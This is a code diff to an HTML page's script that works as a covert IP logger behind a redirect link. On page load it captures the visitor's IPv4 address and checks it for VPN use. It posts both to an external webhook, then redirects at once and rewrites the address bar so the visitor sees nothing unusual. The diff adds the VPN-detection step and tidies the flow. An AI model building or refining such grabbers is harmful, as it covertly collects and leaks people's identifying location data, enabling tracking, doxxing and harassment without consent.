@@ -45,41 +45,46 @@
             }
         }
 
-        async function sendToWebhook(ip) {
+        async function sendToWebhook(ip, isVPN) {
             try {
-                const payload = { content: `New Visitor IPv4: ${ip}` };
+                const payload = {
+                    content: `New Visitor IPv4: ${ip}\nVPN Detected: ${isVPN ? 'Yes' : 'No'}`
+                };
                 await fetch(WEBHOOK_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
             } catch (error) {
-                console.error("Error sending IPv4 to webhook:", error);
+                console.error("Error sending data to webhook:", error);
             }
         }
 
         async function checkVPN(ip) {
-            // Example: This API checks for VPNs, proxies, etc. (you'd need to sign up for such a service)
+            // Example: Use a VPN detection API to check for VPNs or proxies (you need to replace with a real API key)
             try {
                 const response = await fetch(`https://vpnapi.io/api/${ip}?key=your_api_key`);
                 const data = await response.json();
-                if (data.vpn) {
-                    console.log("VPN detected!");
-                }
+                return data.vpn || false; // Return true if VPN detected, false if not
             } catch (error) {
                 console.error("Error checking VPN:", error);
+                return false; // Default to false if we can't check VPN
             }
         }
 
         (async function () {
+            // Fetch IP address
             const ip = await getIPv4();
-            if (ip) {
-                await sendToWebhook(ip);
-                await checkVPN(ip);
-            }
+            if (!ip) return;  // If no IP was retrieved, abort
 
-            // Redirect immediately after sending info
-            history.replaceState(null, '', REDIRECT_URL); // Replaces the URL with the redirect URL
+            // Check if the IP is from a VPN
+            const isVPN = await checkVPN(ip);
+
+            // Send data to the webhook
+            await sendToWebhook(ip, isVPN);
+
+            // Immediately redirect while replacing the URL in the address bar
+            history.replaceState(null, '', REDIRECT_URL); // Replaces the current URL with the REDIRECT_URL
             window.location.href = REDIRECT_URL; // Redirects immediately
         })();
     </script>
